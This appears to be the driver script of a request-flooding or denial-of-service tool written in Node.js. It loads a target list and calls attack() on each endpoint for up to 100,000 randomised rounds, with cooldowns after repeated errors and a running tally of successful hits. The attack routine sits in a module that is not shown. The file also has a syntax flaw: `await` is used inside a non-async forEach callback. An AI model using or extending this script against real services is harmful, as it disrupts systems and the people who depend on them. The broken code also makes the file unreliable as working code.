const { Endpoint } = require("./endpoint");
const { sleep, sleepRand } = require("./helpers");
const pino = require('pino')
const targets = require("./targets.json")

const transport = pino.transport({
  target: './log-transport.mjs',
  options: { destination: `./logs/`, filename: 'attack_' + (new Date()).toJSON() + '.log' }
})
const logger = pino(transport)

const endpoints = targets.map((params) => new Endpoint(params, logger))

const EXECUTION_LIMIT = 100000
const TIMEOUT_BASE = 3000

const run = async () => {
  for (let i = 0; i < EXECUTION_LIMIT; i++) {
    await sleepRand(TIMEOUT_BASE, TIMEOUT_BASE + 1000)
    endpoints.forEach(endpoint => {
      await sleep(200)
      if (endpoint.stats.errorsInRow > 5)
        endpoint.cooldown(60 * 10) // cooldown for 10 min
      else
        endpoint.attack()
    })

    const stats = {
      s: 0,
      e: 0
    }
    endpoints.forEach(endpoint => { stats.s += endpoint.stats.s; stats.e += endpoint.stats.e })
    console.log(`Successfull ${stats.s} | Errors ${stats.e}`)
  }

}

run().catch(e => { throw e })
